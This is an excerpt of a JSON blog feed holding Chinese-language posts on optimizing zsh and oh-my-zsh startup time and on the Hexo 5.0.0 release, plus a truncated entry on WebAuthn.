class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]